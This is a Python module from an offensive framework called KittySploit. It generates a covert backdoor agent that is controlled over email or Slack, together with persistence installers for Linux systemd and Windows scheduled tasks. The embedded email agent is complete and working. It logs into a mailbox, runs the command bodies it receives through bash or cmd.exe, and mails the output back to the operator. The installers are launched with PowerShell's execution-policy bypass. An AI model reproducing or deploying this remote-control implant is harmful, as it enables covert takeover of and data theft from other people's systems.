from kittysploit import *

from lib.c2.agent_installer import (
    build_install_readme,
    build_linux_install_sh,
    build_windows_schtasks_install_ps1,
)
from lib.c2.slack_reverse_agent import build_slack_reverse_agent_script


class Module(Backdoor):
    """Covert-channel agent pack (email or Slack) with persistence installers."""

    __info__ = {
        "name": "Covert Channel Agent Installer Pack",
        "description": (
            "Writes email or Slack polling agent plus Linux systemd / Windows schtasks "
            "install scripts. Email: listeners/email/reverse_email. "
            "Slack: listeners/messaging/slack_socketmode."
        ),
        "author": "KittySploit Team",
        "platform": Platform.MULTI,
        "arch": Arch.PYTHON,
        "session_type": SessionType.POLLING,
    }

    channel = OptEnum(["email", "slack"], "Covert channel", True)

    # Slack options
    bot_token = OptString("", "Slack bot token (xoxb-...)", False)
    channel_id = OptString("", "Slack channel ID", False)
    slack_client_id = OptString("slack-agent", "Slack client ID", False)
    command_prefix = OptString("!ks", "Slack message prefix", False)
    slack_poll_interval = OptInteger(5, "Slack poll interval seconds", False)

    # Email options
    operator_email = OptString("", "Operator mailbox (listener address)", False)
    imap_host = OptString("imap.gmail.com", "IMAP host", False)
    imap_port = OptPort(993, "IMAP port", False)
    imap_user = OptString("", "Victim mailbox user", False)
    imap_password = OptString("", "Victim mailbox password", False)
    use_ssl_imap = OptBool(True, "IMAP SSL", False)
    smtp_host = OptString("smtp.gmail.com", "SMTP host", False)
    smtp_port = OptPort(587, "SMTP port", False)
    smtp_user = OptString("", "SMTP user (usually same as imap_user)", False)
    smtp_password = OptString("", "SMTP password", False)
    use_ssl_smtp = OptBool(False, "SMTP SSL (465)", False)
    use_tls_smtp = OptBool(True, "SMTP STARTTLS", False)
    subject_prefix = OptString("[KS]", "Email subject prefix", False)
    mailbox = OptString("INBOX", "IMAP mailbox", False)
    email_poll_interval = OptInteger(30, "Email poll interval seconds", False)

    install_target = OptEnum(["both", "linux", "windows"], "Install scripts to generate", False)
    service_name = OptString("ks-covert", "Service / task name", False)
    install_dir_linux = OptString("/opt/ks-covert", "Linux install directory", False)
    install_dir_windows = OptString(r"C:\ProgramData\ks-covert", "Windows install directory", False)
    python_binary_linux = OptString("python3", "Python on Linux", False)
    python_binary_windows = OptString("python", "Python on Windows", False)
    agent_filename = OptString("", "Agent filename (empty = auto)", False)
    output_prefix = OptString("", "Output subdir prefix (empty = random)", False)

    def check(self):
        ch = str(self.channel or "email").lower()
        if ch == "slack":
            return bool(str(self.bot_token or "").strip() and str(self.channel_id or "").strip())
        return bool(
            str(self.operator_email or "").strip()
            and str(self.imap_user or "").strip()
            and str(self.imap_password or "").strip()
            and str(self.smtp_user or "").strip()
            and str(self.smtp_password or "").strip()
        )

    def _build_slack_script(self) -> str:
        return build_slack_reverse_agent_script(
            str(self.bot_token).strip(),
            str(self.channel_id).strip(),
            str(self.slack_client_id or "slack-agent").strip() or "slack-agent",
            command_prefix=str(self.command_prefix or "!ks").strip() or "!ks",
            poll_interval=float(max(2, int(self.slack_poll_interval or 5))),
        )

    def _build_email_script(self) -> str:
        op = repr(str(self.operator_email))
        imap_h = repr(str(self.imap_host))
        imap_p = int(self.imap_port)
        imap_u = repr(str(self.imap_user))
        imap_pw = repr(str(self.imap_password))
        ssl_imap = "True" if bool(self.use_ssl_imap) else "False"
        smtp_h = repr(str(self.smtp_host))
        smtp_p = int(self.smtp_port)
        smtp_u = repr(str(self.smtp_user))
        smtp_pw = repr(str(self.smtp_password))
        ssl_smtp = "True" if bool(self.use_ssl_smtp) else "False"
        tls_smtp = "True" if bool(self.use_tls_smtp) else "False"
        prefix = repr(str(self.subject_prefix).strip() or "[KS]")
        interval = max(5, int(self.email_poll_interval or 30))
        mbox = repr(str(self.mailbox or "INBOX"))

        return f'''#!/usr/bin/env python3
import subprocess,time,sys
try:
    import imaplib,smtplib
    from email.mime.text import MIMEText
    from email.parser import BytesParser
    from email import policy
    from email.header import decode_header
except ImportError:
    sys.exit(1)

OP={op}; IMAP_HOST={imap_h}; IMAP_PORT={imap_p}; IMAP_USER={imap_u}; IMAP_PW={imap_pw}
SSL_IMAP={ssl_imap}; SMTP_HOST={smtp_h}; SMTP_PORT={smtp_p}; SMTP_USER={smtp_u}; SMTP_PW={smtp_pw}
SSL_SMTP={ssl_smtp}; TLS_SMTP={tls_smtp}; PREFIX={prefix}; MAILBOX={mbox}; POLL={interval}
SHELL=("cmd.exe","/c") if sys.platform=="win32" else ("/bin/bash","-c")

def decode_header_str(s):
    if not s: return ""
    try:
        parts=decode_header(s); out=[]
        for part,enc in parts:
            out.append(part.decode(enc or "utf-8","replace") if isinstance(part,bytes) else part)
        return "".join(out)
    except Exception: return str(s)

def get_body(msg):
    body=""
    if msg.is_multipart():
        for part in msg.walk():
            if part.get_content_type()=="text/plain":
                pl=part.get_payload(decode=True)
                if pl: body=pl.decode(part.get_content_charset() or "utf-8","replace"); break
    else:
        pl=msg.get_payload(decode=True)
        if pl: body=pl.decode(msg.get_content_charset() or "utf-8","replace")
    return (body or "").strip()

def send_email(to, subject, body):
    try:
        msg=MIMEText(body,"plain","utf-8"); msg["Subject"]=subject; msg["From"]=SMTP_USER; msg["To"]=to
        if SSL_SMTP:
            with smtplib.SMTP_SSL(SMTP_HOST,SMTP_PORT) as s: s.login(SMTP_USER,SMTP_PW); s.sendmail(SMTP_USER,[to],msg.as_string())
        else:
            with smtplib.SMTP(SMTP_HOST,SMTP_PORT) as s:
                if TLS_SMTP: s.starttls()
                s.login(SMTP_USER,SMTP_PW); s.sendmail(SMTP_USER,[to],msg.as_string())
        return True
    except Exception: return False

def run_cmd(cmd):
    try:
        p=subprocess.run([SHELL[0],SHELL[1],cmd],capture_output=True,text=True,timeout=120)
        out=(p.stdout or "")+(p.stderr or "") or ("[exit %s]"%p.returncode)
        return out, p.returncode
    except Exception as e: return "ERROR:%s"%e, 1

def main():
    send_email(OP, PREFIX+" CHECKIN", "ready from "+IMAP_USER)
    seen=set()
    while True:
        try:
            conn=imaplib.IMAP4_SSL(IMAP_HOST,IMAP_PORT) if SSL_IMAP else imaplib.IMAP4(IMAP_HOST,IMAP_PORT)
            conn.login(IMAP_USER,IMAP_PW); conn.select(MAILBOX)
            typ,data=conn.search(None,"UNSEEN")
            if typ!="OK": conn.logout(); time.sleep(POLL); continue
            for uid in data[0].split():
                typ,msg_data=conn.fetch(uid,"(RFC822)")
                if typ!="OK" or not msg_data: continue
                msg=BytesParser(policy=policy.default).parsebytes(msg_data[0][1])
                subj=decode_header_str(msg.get("Subject",""))
                if PREFIX not in subj: continue
                parts=subj.split(None,1)
                if len(parts)<2: continue
                cmd_id=parts[1].strip()
                if not cmd_id.startswith("cmd_"): continue
                if uid in seen: continue
                seen.add(uid)
                cmd=get_body(msg).strip()
                conn.store(uid,"+FLAGS","\\Seen")
                out,ret=run_cmd(cmd)
                send_email(OP, PREFIX+" "+cmd_id, "CMD_ID: "+cmd_id+"\\n"+out)
            conn.logout()
        except Exception: pass
        time.sleep(POLL)

if __name__=="__main__":
    main()
'''

    def run(self):
        if not self.check():
            ch = str(self.channel or "email").lower()
            if ch == "slack":
                print_error("bot_token and channel_id are required for Slack")
            else:
                print_error("operator_email, imap/smtp credentials are required for email")
            return False

        ch = str(self.channel or "email").lower()
        script = self._build_slack_script() if ch == "slack" else self._build_email_script()

        default_name = f"{ch}_covert_agent.py"
        agent_name = str(self.agent_filename or "").strip() or default_name
        if not agent_name.endswith(".py"):
            agent_name += ".py"

        prefix = str(self.output_prefix or "").strip() or (self.random_text(8) + f"_{ch}_installer")
        subdir = f"{prefix}/"

        if not self.write_out_dir(subdir + agent_name, script):
            print_error("Failed to write agent script")
            return False

        target = str(self.install_target or "both").lower()
        svc = str(self.service_name or "ks-covert").strip() or "ks-covert"
        linux_cmd = None
        windows_cmd = None

        if target in ("both", "linux"):
            linux_sh = build_linux_install_sh(
                install_dir=str(self.install_dir_linux or "/opt/ks-covert"),
                agent_filename=agent_name,
                service_name=svc,
                python_binary=str(self.python_binary_linux or "python3"),
                unit_description=f"Covert {ch} agent",
            )
            self.write_out_dir(subdir + "install_linux.sh", linux_sh)
            linux_cmd = f"chmod +x install_linux.sh && sudo ./install_linux.sh"

        if target in ("both", "windows"):
            win_ps1 = build_windows_schtasks_install_ps1(
                install_dir=str(self.install_dir_windows or r"C:\ProgramData\ks-covert"),
                agent_filename=agent_name,
                task_name=svc,
                python_binary=str(self.python_binary_windows or "python"),
            )
            self.write_out_dir(subdir + "install_windows.ps1", win_ps1)
            windows_cmd = "powershell -ExecutionPolicy Bypass -File .\\install_windows.ps1"

        listener = (
            "listeners/messaging/slack_socketmode"
            if ch == "slack"
            else "listeners/email/reverse_email"
        )
        readme = build_install_readme(
            title=f"Covert {ch.title()} Agent Installer",
            callback=listener,
            linux_cmd=linux_cmd,
            windows_cmd=windows_cmd,
            notes=f"Start {listener} with matching options before deploying the agent.",
        )
        self.write_out_dir(subdir + "README.md", readme)

        print_success(f"Generated {ch} installer pack under: {prefix}/")
        print_info(f"Listener: {listener}")
        return True
